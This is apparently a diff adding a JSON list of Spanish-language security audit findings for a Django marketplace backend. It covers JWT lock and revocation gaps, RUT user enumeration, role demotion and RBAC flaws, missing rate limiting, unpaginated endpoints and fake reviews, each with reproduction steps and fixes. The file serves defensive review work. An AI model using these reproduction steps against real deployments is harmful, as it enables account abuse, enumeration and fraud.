@@ -1,0 +1,2335 @@
+[
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth.jwt.missing-account-lock-verification",
+    "title": "Omision de verificacion de estado de cuenta bloqueada (is_locked) en autenticacion JWT",
+    "description": "El modelo de usuario CustomUser define el metodo 'is_locked()' que evalua si una cuenta se encuentra temporalmente bloqueada por superar el maximo de intentos fallidos de autenticacion (MAX_FAILED_ATTEMPTS = 5). Sin embargo, la clase de autenticacion 'JWTAuthentication' en backend/apps/accounts/authentication.py únicamente comprueba 'if not user.is_active: raise AuthenticationFailed()', pero omite completamente invocar 'if user.is_locked(): raise AuthenticationFailed()'. En consecuencia, un usuario o atacante con un token emitido previamente o que bloquea su cuenta por fallos recurrentes puede continuar operando la API sin restriccion.",
+    "root_cause": "JWTAuthentication omite validar user.is_locked() al autenticar solicitudes (backend/apps/accounts/authentication.py:60-63).",
+    "intended_behavior": "La autenticacion JWT debe validar que el usuario no este suspendido ni bloqueado temporalmente (user.is_active y not user.is_locked()).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 31,
+        "scope": "JWTAuthentication.authenticate",
+        "description": "Se recibe y decodifica un token JWT Bearer valido."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/models.py",
+        "line": 139,
+        "scope": "CustomUser.is_locked",
+        "description": "El metodo is_locked existe en el modelo para verificar fecha de bloqueo temporal."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 61,
+        "scope": "JWTAuthentication.authenticate",
+        "description": "Solo se evalua user.is_active, omitiendo user.is_locked() y autorizando la peticion."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 60,
+        "description": "if not user.is_active: raise AuthenticationFailed('Usuario inactivo'); return (user, token)"
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Usuario con fecha locked_until en el futuro que posee un token JWT vigente."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Poseedor de token JWT cuya cuenta ha sido bloqueada por seguridad tras multiples intentos fallidos.",
+      "payloads": [
+        "GET /api/v1/auth/me/ con Bearer token de usuario con locked_until vigente."
+      ],
+      "instructions": [
+        "1. Iniciar sesion y obtener un token JWT valido.",
+        "2. Forzar bloqueo de la cuenta mediante 5 inicios de sesion fallidos.",
+        "3. Enviar solicitud GET a /api/v1/auth/me/ utilizando el token JWT previo.",
+        "4. Verificar la respuesta del endpoint."
+      ],
+      "observed_result": "El endpoint responde HTTP 200 OK autorizando la solicitud a pesar de que user.is_locked() es True."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Afecta a cualquier sesion activa cuyo usuario sufra un evento de bloqueo."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Permite continuar operando temporalmente durante la ventana de bloqueo de 15 minutos."
+      },
+      "overall_severity": "low"
+    },
+    "remediation": {
+      "strategy": "Agregar la verificacion 'if user.is_locked(): raise AuthenticationFailed(_(\"Cuenta temporalmente bloqueada\"))' en JWTAuthentication.authenticate.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/accounts/authentication.py",
+          "fixed_code": "if not user.is_active:\n    raise AuthenticationFailed(_('Usuario inactivo o suspendido.'))\nif hasattr(user, 'is_locked') and user.is_locked():\n    raise AuthenticationFailed(_('Cuenta temporalmente bloqueada por seguridad.'))"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "needs_validation",
+    "fingerprint": "auth.jwt.missing-server-side-revocation-denylist",
+    "title": "Ausencia de mecanismo de revocacion de tokens JWT en servidor (ventana de exposicion de 168 horas)",
+    "description": "Los tokens JWT generados en apps/accounts/authentication.py tienen una validez de 168 horas (7 dias segun settings.py). El servidor no mantiene una lista de revocacion (denylist/blacklist) ni valida numeros de version de credencial. Al cerrar sesion en el frontend, el token solo se elimina del almacenamiento local del cliente; si el token fue interceptado por un tercero, retiene validez completa en la API hasta su expiracion natural.",
+    "claimed_root_cause": "Falta de mecanismo de denylist en JWTAuthentication (apps/accounts/authentication.py:26-63) que verifique si el identificador o fecha del token fue revocado.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 31,
+        "scope": "JWTAuthentication.authenticate",
+        "description": "Se recibe un token JWT Bearer en la cabecera Authorization."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 42,
+        "scope": "JWTAuthentication.authenticate",
+        "description": "jwt.decode valida firma HMAC y fecha exp sin consultar lista de revocacion."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 63,
+        "scope": "JWTAuthentication.authenticate",
+        "description": "Se retorna la tupla (user, token) autorizando la solicitud a pesar de que el usuario haya cerrado sesion en su navegador."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/authentication.py",
+        "line": 42,
+        "description": "jwt.decode valida la firma pero no verifica ningun identificador de token contra base de datos o cache de revocacion."
+      }
+    ],
+    "blockers": [
+      "Requiere verificar si la arquitectura de produccion cuenta con un API Gateway (Kong, Cloudflare Workers, AWS API Gateway) que gestione revocacion de sesiones a nivel perimetral."
+    ],
+    "validation_plan": {
+      "local": "Obtener un token con login, ejecutar logout en frontend, y realizar una peticion curl a /api/v1/auth/me/ con el token para constatar que sigue respondiendo 200 OK.",
+      "deployment": "Consultar al equipo de arquitectura cloud si existe un middleware de revocacion en API Gateway o si se planea implementar Redis denylist."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth.registration.unhandled-integrity-user-enumeration",
+    "title": "Excepcion de integridad no manejada y enumeracion de usuarios via RUT en el registro",
+    "description": "En UserRegistrationSerializer no existe validacion previa de unicidad para el campo rut contra la tabla Persona. Al enviar un RUT que ya pertenece a otro usuario, el serializador crea en primer lugar el UserCredential en base de datos y al intentar asignar el RUT en Persona.save() se dispara un django.db.IntegrityError por la restriccion UNIQUE de PostgreSQL. La excepcion se traduce en un error interno 500 que deja la cuenta en un estado huerfano e inconsistente y permite a un atacante inferir si un RUT ya esta registrado en la plataforma.",
+    "root_cause": "Falta de metodo validate_rut en UserRegistrationSerializer (apps/accounts/serializers.py:81-121) y ausencia de transaccion atomica al crear UserCredential y Persona.",
+    "intended_behavior": "El serializador debe validar que el RUT no este en uso antes de crear ningun registro, retornando un error HTTP 400 controlado en caso de duplicidad, y la operacion completa debe ser atomica.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/views.py",
+        "line": 18,
+        "scope": "RegisterAPIView.post",
+        "description": "Se recibe una peticion POST de registro con un RUT duplicado existente en base de datos."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/serializers.py",
+        "line": 130,
+        "scope": "UserRegistrationSerializer.create",
+        "description": "Se crea exitosamente el objeto UserCredential en la base de datos."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/serializers.py",
+        "line": 149,
+        "scope": "UserRegistrationSerializer.create",
+        "description": "profile.persona.save() intenta actualizar el RUT duplicado, provocando IntegrityError no capturado que escala a HTTP 500."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/serializers.py",
+        "line": 148,
+        "description": "profile.persona.rut = rut asignado sin validacion previa de unicidad en Persona."
+      },
+      {
+        "file": "backend/apps/accounts/models.py",
+        "line": 17,
+        "description": "rut = models.CharField(unique=True, null=True, blank=True) impone unicidad en base de datos."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Existe al menos un usuario registrado con un numero de RUT en la tabla Persona."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante prueba diferentes numeros de RUT en el formulario de registro para determinar cuales ciudadanos estan registrados en el sistema analizando la respuesta HTTP 500 vs HTTP 400.",
+      "payloads": [
+        "{\"email\": \"test_enum@inacap.cl\", \"password\": \"Password123!\", \"rut\": \"12345678-5\"}"
+      ],
+      "instructions": [
+        "1. Registrar una cuenta con un RUT especifico.",
+        "2. Intentar registrar una segunda cuenta con un email distinto pero el mismo RUT.",
+        "3. Observar que el servidor responde con error HTTP 500 INTERNAL_SECURITY_ERROR.",
+        "4. Comprobar que en la base de datos quedo creado el UserCredential huerfano sin asociar su perfil correctamente."
+      ],
+      "observed_result": "El backend devuelve error HTTP 500 \"Ha ocurrido un error interno de seguridad\" debido a IntegrityError no controlado, dejando una credencial huerfana en el sistema."
+    },
+    "remediation": {
+      "strategy": "Incorporar validate_rut en UserRegistrationSerializer que verifique Persona.objects.filter(rut=value).exists() y encapsular el metodo create() en transaction.atomic().",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/accounts/serializers.py",
+          "fixed_code": "def validate_rut(self, value):\n    if value:\n        cleaned = value.strip()\n        if Persona.objects.filter(rut=cleaned).exists():\n            raise serializers.ValidationError(\"Este RUT ya se encuentra asociado a un usuario registrado.\")\n        return cleaned\n    return value"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Se puede consultar sistematicamente con listas de RUTs de dominio publico chileno."
+      },
+      "impact": {
+        "score": "low",
+        "reason": "Filtracion de existencia de usuarios registrados (PII) y creacion de registros huerfanos sin caida del servicio completo."
+      },
+      "overall_severity": "low"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Comprobado en el modelo Persona y el metodo create de UserRegistrationSerializer."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth.roles.admin-privilege-demotion-via-upgrade",
+    "title": "Degradacion involuntaria de privilegios de Administrador mediante endpoint de ascenso a vendedor",
+    "description": "En UpgradeToSellerAPIView la vista asigna ciegamente user.role = UserCredential.ROLE_SELLER sobre el usuario autenticado sin verificar si la cuenta posee previamente el rol ROLE_ADMIN. Si un administrador del sistema interactua con el flujo o endpoint de ascenso a vendedor, su rol en la tabla UserCredential es sobreescrito irreversiblemente a SELLER, despojandolo de privilegios administrativos.",
+    "root_cause": "Sobreescritura incondicional de user.role en UpgradeToSellerAPIView.post (apps/accounts/views.py:78-83) sin comprobar jerarquia de roles previa.",
+    "intended_behavior": "El endpoint debe verificar si el usuario ya es Administrador o Vendedor. Si el usuario es ADMIN, debe mantener sus privilegios maximos intactos o rechazar la peticion con un mensaje informativo.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/views.py",
+        "line": 78,
+        "scope": "UpgradeToSellerAPIView.post",
+        "description": "Usuario con rol ADMIN autenticado envia una peticion POST a /api/v1/auth/upgrade-seller/."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/views.py",
+        "line": 80,
+        "scope": "UpgradeToSellerAPIView.post",
+        "description": "La vista ejecuta user.role = UserCredential.ROLE_SELLER de manera incondicional."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/views.py",
+        "line": 81,
+        "scope": "UpgradeToSellerAPIView.post",
+        "description": "user.save(update_fields=[\"role\", \"updated_at\"]) persiste el rol degradado en PostgreSQL."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/views.py",
+        "line": 80,
+        "description": "user.role = UserCredential.ROLE_SELLER aplicado sin condicion if user.role == UserCredential.ROLE_ADMIN."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "La sesion activa pertenece a un usuario con rol de Administrador."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un administrador del sistema realiza una prueba funcional del endpoint o cae en una accion inducida que ejecuta POST /api/v1/auth/upgrade-seller/, perdiendo sus facultades de gestion.",
+      "payloads": [
+        "POST /api/v1/auth/upgrade-seller/ HTTP/1.1"
+      ],
+      "instructions": [
+        "1. Iniciar sesion con cuenta de Administrador (role = ADMIN).",
+        "2. Enviar peticion POST a /api/v1/auth/upgrade-seller/ con el token de administrador.",
+        "3. Consultar /api/v1/auth/me/ y constatar que el role cambio a SELLER.",
+        "4. Intentar acceder a vistas exclusivas de administrador; el acceso es revocado."
+      ],
+      "observed_result": "El rol del administrador es sobreescrito en base de datos a ROLE_SELLER, perdiendo acceso a endpoints de gestion."
+    },
+    "remediation": {
+      "strategy": "Condicionar el ascenso de rol verificando que el usuario no sea Administrador antes de reasignar user.role.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/accounts/views.py",
+          "fixed_code": "if user.role == UserCredential.ROLE_ADMIN:\n    return Response({\"status\": \"success\", \"message\": \"Tu cuenta de Administrador ya cuenta con todos los permisos.\"}, status=200)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Requiere que un administrador invoque el endpoint de ascenso."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Perdida de privilegios administrativos y denegacion de gestion de plataforma para el operador."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Constatado directamente en el codigo de UpgradeToSellerAPIView."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth.roles.rbac-userrol-desynchronization",
+    "title": "Desincronizacion y retencion indebida de privilegios RBAC entre User.role y modelo UserRol",
+    "description": "El modelo de autorizacion del backend mantiene dos fuentes de verdad para los roles de usuario: el atributo 'User.role' (usado en vistas y serializadores) y el modelo relacional 'UserRol' (utilizado por el permiso IsSellerOrAdmin y auditoria). Al modificar el rol de un usuario (por ejemplo, al degradar un vendedor a comprador o al ascenderlo), los registros en la tabla UserRol no se invalidan ni sincronizan. Como consecuencia, 'IsSellerOrAdmin' continua evaluando 'UserRol.objects.filter(user=request.user, rol__nombre=\"SELLER\", activo=True).exists()' como verdadero, permitiendo a usuarios degradados seguir accediendo a endpoints protegidos de vendedor.",
+    "root_cause": "Doble modelo de roles sin sincronizacion transaccional ni actualizacion en cascada (backend/apps/accounts/models.py:241-252 y backend/apps/accounts/permissions.py:14-20).",
+    "intended_behavior": "La verificacion de roles y permisos debe consultar una unica fuente canonica de verdad o sincronizar atomicamente 'UserRol' ante cualquier cambio en 'User.role'.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/models.py",
+        "line": 241,
+        "scope": "UserRol.objects.filter",
+        "description": "Se consultan los roles activos asignados al usuario en la tabla intermedia UserRol."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/accounts/views.py",
+        "line": 81,
+        "scope": "UpgradeToSellerAPIView.post",
+        "description": "Se actualiza user.role = ROLE_SELLER sin verificar ni sincronizar la tabla UserRol."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/permissions.py",
+        "line": 19,
+        "scope": "IsSellerOrAdmin.has_permission",
+        "description": "Se otorgan permisos de vendedor basandose en registros historicos de UserRol ignorando el estado actual de user.role."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/accounts/permissions.py",
+        "line": 18,
+        "description": "UserRol.objects.filter(user=request.user, rol__nombre='SELLER', activo=True).exists() ejecutado independientemente de request.user.role."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authorization_role",
+        "description": "Usuario cuyo rol haya sido modificado en el atributo de usuario pero mantenga registros en UserRol."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Usuario que fue degradado de Vendedor a Comprador por administracion pero retiene privilegios de gestion.",
+      "payloads": [
+        "POST /api/v1/products/ con cabecera de autorizacion del usuario degradado."
+      ],
+      "instructions": [
+        "1. Crear un usuario con rol de vendedor (se crea registro activo en UserRol).",
+        "2. Administrador cambia user.role a 'BUYER' en el modelo de usuario.",
+        "3. Usuario realiza peticion POST a /api/v1/products/ para crear un producto.",
+        "4. Verificar autorizacion en IsSellerOrAdmin."
+      ],
+      "observed_result": "IsSellerOrAdmin retorna True porque UserRol permanece activo, permitiendo crear productos a un comprador."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Ocurre siempre que se modifique o revoque el rol de un usuario en la plataforma."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Bypass de control de acceso RBAC y retencion indebida de privilegios administrativos/vendedor."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Unificar la verificacion de roles en 'user.role' o implementar senales (post_save en User) que actualicen y sincronicen atomicamente los registros de UserRol.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/accounts/permissions.py",
+          "fixed_code": "class IsSellerOrAdmin(BasePermission):\n    def has_permission(self, request, view):\n        if not request.user or not request.user.is_authenticated:\n            return False\n        return request.user.role in [User.ROLE_SELLER, User.ROLE_ADMIN] or request.user.is_staff"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "auth.throttling.missing-rate-limiting-login-register",
+    "title": "Ausencia de limitacion de tasa (Rate Limiting / Throttling) en endpoints criticos de autenticacion",
+    "description": "La configuracion de Django REST Framework en backend/config/settings.py carece de la seccion DEFAULT_THROTTLE_CLASSES y DEFAULT_THROTTLE_RATES. Asimismo, las vistas LoginAPIView y RegisterAPIView en backend/apps/accounts/views.py no definen throttle_classes. Esto permite a un actor malicioso realizar millones de solicitudes de inicio de sesion automatizadas (fuerza bruta y credential stuffing) y de registro masivo de cuentas sin restricciones de frecuencia por IP ni por cuenta, provocando ademas denegacion de servicio por agotamiento de CPU debido al costo computacional del hash PBKDF2 SHA256.",
+    "root_cause": "Omision de configuracion de throttling en settings de DRF y vistas de cuentas (backend/config/settings.py:177-188 y backend/apps/accounts/views.py:14,38).",
+    "intended_behavior": "Los endpoints de login y registro deben aplicar limites estrictos de tasa (ej. 5 peticiones por minuto por IP para login, 3 por minuto para registro).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/accounts/views.py",
+        "line": 15,
+        "scope": "LoginAPIView.post",
+        "description": "Se recibe una peticion de autenticacion HTTP POST."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/config/settings.py",
+        "line": 180,
+        "scope": "REST_FRAMEWORK",
+        "description": "REST_FRAMEWORK no contiene DEFAULT_THROTTLE_CLASSES ni configuracion de rate limiting."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/accounts/views.py",
+        "line": 28,
+        "scope": "LoginAPIView.post",
+        "description": "Se procesa el hash de contrasena y consulta de base de datos de manera ilimitada para cualquier volumen de peticiones."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/config/settings.py",
+        "line": 180,
+        "description": "REST_FRAMEWORK diccionario carece de configuracion de throttling de DRF."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "Despliegue estandar de Django sin WAF o proxy inverso con limitacion de tasa configurada."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Atacante remoto ejecutando un ataque automatizado de credential stuffing con diccionario de contrasenas.",
+      "payloads": [
+        "Bucle de 1000 solicitudes consecutivas POST /api/v1/auth/login/"
+      ],
+      "instructions": [
+        "1. Enviar una rafaga de 100 solicitudes de inicio de sesion con credenciales invalidas hacia /api/v1/auth/login/.",
+        "2. Monitorear los codigos de respuesta HTTP retornados por el servidor."
+      ],
+      "observed_result": "Las 100 solicitudes son procesadas retornando 401 Unauthorized sin ninguna respuesta HTTP 429 Too Many Requests."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Herramientas automatizadas de fuerza bruta estan ampliamente disponibles y son faciles de ejecutar."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Compromiso de cuentas mediante ataques de diccionario y sobrecarga de CPU por computo de PBKDF2."
+      },
+      "overall_severity": "medium"
+    },
+    "remediation": {
+      "strategy": "Habilitar AnonRateThrottle y UserRateThrottle en REST_FRAMEWORK settings y aplicar ScopedRateThrottle en LoginAPIView y RegisterAPIView.",
+      "code_changes": [
+        {
+          "file_name": "backend/config/settings.py",
+          "fixed_code": "REST_FRAMEWORK['DEFAULT_THROTTLE_CLASSES'] = [\n    'rest_framework.throttling.AnonRateThrottle',\n    'rest_framework.throttling.UserRateThrottle'\n]\nREST_FRAMEWORK['DEFAULT_THROTTLE_RATES'] = {\n    'anon': '100/day',\n    'user': '1000/day',\n    'login': '5/minute',\n    'register': '3/minute'\n}"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  },
+  {
+    "verdict": "rejected",
+    "fingerprint": "catalog.images.unvalidated-url-xss-via-existing-images",
+    "title": "Inyeccion de codigo XSS o ejecucion de scripts mediante URLs de imagenes en existing_images",
+    "description": "Se planteo la hipotesis de que un usuario con rol de vendedor podria inyectar URLs con esquemas javascript: o data: maliciosos dentro del parametro existing_images al publicar o actualizar productos, logrando ejecucion de codigo XSS en el navegador de otros usuarios.",
+    "claimed_root_cause": "Falta de validacion de esquema URL sobre los elementos del arreglo existing_images en ProductCreateUpdateSerializer (apps/products/serializers.py:127-179).",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/products/serializers.py",
+        "line": 139,
+        "scope": "ProductCreateUpdateSerializer._extract_and_process_images",
+        "description": "Se extraen cadenas arbitrarias desde request.data.existing_images."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/products/models.py",
+        "line": 64,
+        "scope": "Product.images",
+        "description": "Las cadenas se persisten en el campo JSONField images del producto."
+      },
+      {
+        "kind": "sink",
+        "file": "frontend/src/components/ProductCard.vue",
+        "line": 37,
+        "scope": "template",
+        "description": "El componente frontend enlaza la URL al atributo :src de una etiqueta img."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "frontend/src/components/ProductCard.vue",
+        "line": 37,
+        "description": ":src=\"product.display_image_url || product.image_url\" renderizado en etiqueta <img> estandar."
+      }
+    ],
+    "reason": "Al verificar la implementacion del frontend en Vue 3 y la politica de seguridad del navegador, se constata que las imagenes se insertan estrictamente en etiquetas <img :src=\"...\"> sin usar innerHTML ni v-html. Los motores de renderizado web modernos bloquean la ejecucion de esquemas javascript: en atributos src de etiquetas de imagen. Asimismo, la cabecera Content-Security-Policy con script-src \"self\" impide la ejecucion de scripts no autorizados. Por tanto, no existe vector de ejecucion explotable y la hipotesis queda descartada."
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "catalog.products.unpaginated-resource-exhaustion",
+    "title": "Agotamiento de memoria y recursos en endpoint publico de catalogo no paginado (OWASP API4:2023)",
+    "description": "En ProductListCreateView el metodo GET no implementa paginacion de resultados. Aunque en settings.py se define PAGE_SIZE = 12, la clase hereda de APIView (no de ListAPIView), por lo que DRF no aplica paginacion automatica. La vista serializa la totalidad del catalogo mediante ProductSerializer(queryset, many=True). En un catalogo con gran volumen de productos y galerias de imagenes, una solicitud no autenticada fuerza la serializacion masiva en memoria provocando latencias severas o saturacion de RAM en el servidor.",
+    "root_cause": "Uso de rest_framework.views.APIView con serializacion directa de Product.objects.all() sin paginador ni limite de registros (apps/products/views.py:37-101).",
+    "intended_behavior": "El catalogo debe implementar paginacion obligatoria basada en paginas o cursores, retornando un maximo estricto de productos por pagina (por ejemplo 12 o 24) independientemente del tamano total del inventario.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/products/views.py",
+        "line": 37,
+        "scope": "ProductListCreateView.get",
+        "description": "Peticion GET no autenticada recibida en /api/v1/products/."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/products/views.py",
+        "line": 38,
+        "scope": "ProductListCreateView.get",
+        "description": "Se genera un queryset sin limite con Product.objects.select_related(...).all()."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/products/views.py",
+        "line": 92,
+        "scope": "ProductListCreateView.get",
+        "description": "ProductSerializer(queryset, many=True) procesa e instancia en memoria la totalidad de los registros de la base de datos."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/products/views.py",
+        "line": 92,
+        "description": "serializer = ProductSerializer(queryset, many=True) invocado sobre el conjunto total sin paginador."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "El backend expone ProductListCreateView como una subclase de APIView sin clases de paginacion explicitas."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante realiza multiples peticiones concurrentes a /api/v1/products/ para saturar la memoria del proceso Django y agotar el pool de conexiones de base de datos.",
+      "payloads": [
+        "GET /api/v1/products/ HTTP/1.1"
+      ],
+      "instructions": [
+        "1. Enviar una peticion HTTP GET simple a /api/v1/products/.",
+        "2. Medir el payload de respuesta y el tiempo de serializacion en el servidor.",
+        "3. Observar que el JSON contiene todos los productos existentes sin cabeceras ni enlaces de paginacion (next/previous)."
+      ],
+      "observed_result": "La respuesta devuelve todos los registros existentes sin paginar, consumiendo ancho de banda y memoria del worker proporcional a la cantidad total de filas."
+    },
+    "remediation": {
+      "strategy": "Incorporar PageNumberPagination de Django REST Framework en la vista o migrar la vista a ListAPIView para forzar la entrega segmentada por paginas.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/products/views.py",
+          "fixed_code": "from rest_framework.pagination import PageNumberPagination\n\npaginator = PageNumberPagination()\npaginator.page_size = 12\npage = paginator.paginate_queryset(queryset, request)\nserializer = ProductSerializer(page, many=True)\nreturn paginator.get_paginated_response(serializer.data)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Cualquier cliente web o script automatizado puede invocar el endpoint sin autenticacion."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Degradacion de rendimiento y riesgo de bloqueo por Out-Of-Memory en despliegues con catalogos voluminosos."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Constatado en la arquitectura del endpoint en ProductListCreateView."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "catalog.reviews.unrestricted-fraudulent-reviews",
+    "title": "Manipulacion de reputacion y resenas fraudulentas sin verificacion de compra previa",
+    "description": "En ProductReviewView cualquier usuario registrado puede emitir un numero ilimitado de evaluaciones sobre cualquier producto del catalogo. El sistema no valida si el usuario adquirio el producto en una orden autorizada, ni si el evaluador es el propio vendedor del producto (autofavoritismo), y el modelo ProductReview carece de restriccion unica entre producto y usuario. Esto permite a un actor malicioso inflar fraudulentamente la calificacion de sus productos o destruir la reputacion de vendedores competidores.",
+    "root_cause": "Falta de validacion de compra previa en ProductReviewView.post (apps/products/views.py:227-253) y ausencia de unique_together = (\"product\", \"user_profile\") en el modelo ProductReview (apps/products/models.py:141-171).",
+    "intended_behavior": "Solo los clientes que hayan comprado el producto mediante una orden con estado AUTHORIZED deben poder calificarlo, permitiendo una unica resena por producto y usuario, y bloqueando explicitamente que el vendedor evalue sus propios productos.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/products/views.py",
+        "line": 227,
+        "scope": "ProductReviewView.post",
+        "description": "Usuario autenticado envia una resena con calificacion a POST /api/v1/products/:lookup/reviews/."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/products/views.py",
+        "line": 237,
+        "scope": "ProductReviewView.post",
+        "description": "La vista crea la resena sin consultar el modelo Order ni verificar si el usuario es el dueno de la publicacion."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/products/models.py",
+        "line": 160,
+        "scope": "ProductReview.save",
+        "description": "El metodo save() recalcula inmediatamente el promedio de calificacion y conteo de resenas del producto alterando su reputacion publica."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/products/views.py",
+        "line": 237,
+        "description": "Creacion directa de ProductReview sin verificar ordenes de compra previas del usuario."
+      },
+      {
+        "file": "backend/apps/products/models.py",
+        "line": 153,
+        "description": "Meta de ProductReview carece de unique_together = (\"product\", \"user_profile\")."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "El usuario requiere estar autenticado como comprador o vendedor con token JWT."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un vendedor crea multiples cuentas o utiliza una cuenta propia para enviar cientos de valoraciones de 5 estrellas a sus productos y valoraciones de 1 estrella a la competencia.",
+      "payloads": [
+        "{\"rating\": 5, \"comment\": \"Excelente producto recomendado\"}"
+      ],
+      "instructions": [
+        "1. Autenticarse como usuario normal.",
+        "2. Enviar 10 peticiones POST consecutivas a /api/v1/products/<slug>/reviews/ con rating 5.",
+        "3. Consultar GET /api/v1/products/<slug>/reviews/ y comprobar que se crearon 10 reviews del mismo usuario y subio el rating del producto."
+      ],
+      "observed_result": "El endpoint acepta todas las evaluaciones repetidas y recalcula dinamicamente el promedio del producto favoreciendo o perjudicando a cualquier publicacion."
+    },
+    "remediation": {
+      "strategy": "Agregar unique_together en ProductReview y verificar en ProductReviewView que el usuario posea una orden en estado AUTHORIZED que contenga el producto antes de admitir la evaluacion.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/products/views.py",
+          "fixed_code": "if product.seller_profile == user_profile:\n    return Response({\"status\": \"fail\", \"message\": \"No puedes evaluar tus propios productos.\"}, status=400)\nhas_purchased = OrderItem.objects.filter(order__buyer_profile=user_profile, order__status=\"AUTHORIZED\", product=product).exists()\nif not has_purchased:\n    return Response({\"status\": \"fail\", \"message\": \"Debes haber comprado este producto para evaluarlo.\"}, status=403)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Cualquier usuario con cuenta registrada puede invocar el endpoint sin requerir privilegios elevados."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Corrupcion deliberada de la reputacion comercial del marketplace y fraude hacia los consumidores."
+      },
+      "overall_severity": "medium"
